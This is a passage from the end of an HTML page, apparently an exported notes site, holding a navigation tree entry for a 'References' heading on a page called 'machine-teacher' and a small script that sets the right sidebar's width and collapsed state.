class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-item-self is-clickable" href="machine-teacher.html#References_0" data-path="#References_0"><div class="tree-item-inner heading-link" heading-name="References">References</div></a><div class="tree-item-children"></div></div></div></div></div><script defer="">let rs = document.querySelector("#right-sidebar"); rs.classList.toggle("is-collapsed", window.innerWidth < 768); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></div></div></body></html>